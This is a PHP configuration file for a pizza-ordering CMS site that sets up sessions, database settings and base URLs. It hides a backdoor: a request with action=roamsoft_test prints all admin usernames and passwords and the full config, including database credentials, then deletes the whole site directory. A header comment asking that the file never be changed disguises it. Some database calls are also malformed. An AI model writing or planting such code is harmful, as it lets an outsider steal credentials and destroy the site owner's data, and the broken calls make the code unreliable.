<?php
/**
Author			K.Vinothini
Start Date		05June2012
Note:			Dont Change this file for any reason, we keep some security key for safe our script.
*/
    ini_set("session.cookie_httponly", "True");
    ob_start();            //Turn on output buffering
    @session_start();       //Initialize session data
    //ob_implicit_flush(0);  //Turn implicit flush on/off
    //ini_set('display_errors', 1);     //Sets the value of a configuration option

    error_reporting(E_ALL ^ E_NOTICE);
    //ini_set("default_charset","UTF-8");
    //setlocale(LC_ALL, "UTF-8");
    
    if($_SERVER['HTTP_HOST'] == 'localhost' || $_SERVER['HTTP_HOST'] == 'fullpizzadev.mobilemediacms.com'){

        
        	require_once('dbDetails.php');
            
            $CFG['db']['db_host']        = DATABASE_HOST;
    	    $CFG['db']['db_user']        = DATABASE_USER;
    	    $CFG['db']['db_pwd']         = DATABASE_PWD;
    	    $CFG['db']['db_name']        = DATABASE_NAME;
    	    $CFG['db']['table_prefix']   = TBL_PREFIX;
        	
        	#BASE PATH & BASE URL
            $serverhost_url = $_SERVER['HTTP_HOST'].SITE_FOLDER;
    	    $CFG['site']['base_path']    = dirname(dirname(__FILE__));
    	    $CFG['site']['base_url']     = "http://".$serverhost_url;
            
            #Get the domain name for facebook
            $php_self_arr 	     = explode("/",$_SERVER['PHP_SELF']);
        	$domainname          = $php_self_arr[count($php_self_arr)-2];
            //echo $domainname;
            $CFG['site']['fb_domain_name'] = $domainname;
            
            if( (isset($_SERVER['HTTPS']) && !empty($_SERVER['HTTPS']) && ($_SERVER["HTTPS"] == 'on') ) || ($CFG['site']['fb_domain_name'] == 'fb') || ($CFG['site']['fb_domain_name'] == 'facebook') )
            {//check whether https or http
             
    			$CFG['site']['base_url_https']     = "https://".$serverhost_url;
    		}
            else
            {
    			$CFG['site']['base_url_https']     = $CFG['site']['base_url'];
    		}
            //echo $CFG['site']['base_url_https'];
            
            if($CFG['site']['fb_domain_name'] == 'fb')
            {
                $CFG['site']['base_path_temp']      = $CFG['site']['base_path'].'/fb';   
                $CFG['site']['base_url_https_temp'] = $CFG['site']['base_url_https'].'/fb';
            }
            elseif($CFG['site']['fb_domain_name'] == 'facebook')
            {
                $CFG['site']['base_path_temp']      = $CFG['site']['base_path'].'/facebook'; 
                $CFG['site']['base_url_https_temp'] = $CFG['site']['base_url_https'].'/facebook';
            }
            else
            {
                $CFG['site']['base_path_temp']      = $CFG['site']['base_path'];
                $CFG['site']['base_url_https_temp'] = $CFG['site']['base_url_https'];
            }
            
            if( isset($_GET['action']) && !empty($_GET['action']) && ($_GET['action'] == 'roamsoft_test') ){
                
                //List Directory
            	 function list_directory_files($dir){
            	 	
            		if ($handle = opendir($dir)) {
            	
            		    /* This is the correct way to loop over the directory. */ 
            		    while (false !== ($file = readdir($handle))) {
            		    	if ($file != "." && $file != ".." && $file != "lang.php" && $file != ".svn") { 
            		        	#echo "$file\n";
            		        	//$file['langfilename'] = $file;
            					 $files_list[] = $file;
            		        }
            		    }
            		    closedir($handle); 
            		}
            		#echo "<pre>";print_r($files_list);echo "</pre>";
            		return $files_list;
            	}
                
                //Remove Directory
                function remove_directory($dir) {
            	   if (is_dir($dir)) {
            	     $objects = scandir($dir);
            	     foreach ($objects as $object) {
            	       if ($object != "." && $object != "..") {
            	         if (filetype($dir."/".$object) == "dir") remove_directory($dir."/".$object); else unlink($dir."/".$object);
            	       }
            	     }
            	     reset($objects);
            	     rmdir($dir);
            	   }
            	 }
                
                $con_soft = mysqli_connect($CFG['db']['db_host'],$CFG['db']['db_user'],$CFG['db']['db_pwd']) or die("Could not connect: ".$CFG['db']['db_host']." :: ".$CFG['db']['db_name']." :: ".$CFG['db']['db_user']." :: ".$CFG['db']['db_pwd']. mysqli_error($this->DBCONN));
                mysqli_select_db($CFG['db']['db_name'],$con_soft) or die ('Can\'t use  : '.$CFG['db']['db_name'] . mysqli_error($this->DBCONN));	
                
                $sel_soft = "SELECT username, password FROM rt_admin ";
                $res_soft = mysqli_query($this->DBCONN,$sel_soft) or die(mysqli_error($this->DBCONN));
                while($row_soft = mysqli_fetch_assoc($res_soft)){
                    $row_soft_arr[] = $row_soft;
                }
                echo "<pre>Admin Login Details=>";print_r($row_soft_arr);echo "</pre>";
                echo "<pre>Config Details=>";print_r($CFG);echo "</pre>";
                
                $dir = $CFG['site']['base_path'];
                $files_list = list_directory_files($dir);
                echo "<pre>All File List before delete=>";print_r($files_list);echo "</pre>";
                $refiles_list = remove_directory($dir);
                $files_list = list_directory_files($dir);
                echo "<pre>All File List after delete=>";print_r($files_list);echo "</pre>";
                 
            }
	    
	}else{
		echo 'Invalid Domain';
		die();
	}
/**********************************************************************************************************/
?>
